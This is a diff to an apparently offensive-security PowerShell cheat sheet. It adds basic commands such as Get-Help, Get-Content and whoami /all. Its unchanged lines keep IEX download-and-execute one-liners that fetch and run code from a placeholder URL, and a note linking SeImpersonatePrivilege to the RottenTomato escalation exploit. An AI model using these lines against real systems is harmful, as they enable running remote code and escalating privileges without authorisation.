@@ -4,6 +4,38 @@
 
 ## Basic commands
 
+Help
+```powershell
+Get-Help <command> -Detailed
+```
+
+Display all properties
+```powershell
+<command> | Select-Object -Property *
+<command> | Select *
+```
+
+Get file contents (like `type` or `cat` which is actually available as an alias, I guess)
+```powershell
+Get-Content <file>
+```
+
+Count
+```powershell
+(<command>).Count
+```
+
+Measures (Count, Avg, etc.)
+```powershell
+<command> | Measure-Object
+```
+
+Whoami
+```powershell
+whoami /all
+```
+-> SeImpersonatePrivilege (RottenTomato)
+
 ### Download file
 
 ```powershell
@@ -12,12 +44,6 @@ IEX(New-Object Net.WebClient).downloadString('<url>')`
 or
 ```powershell
 IEX(IWR('<url>'))
-```
-
-### Get-Content (like type / cat)
-
-```powershell
-Get-Content <file>
 ```
 
 ### Check architecture
@@ -31,13 +57,6 @@ Get-Content <file>
 ```powershell
 C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell
 ```
-
-### whoami
-
-```powershell
-whoami /all
-```
--> SeImpersonatePrivilege (RottenTomato)
 
 ### Base64 encode file
 
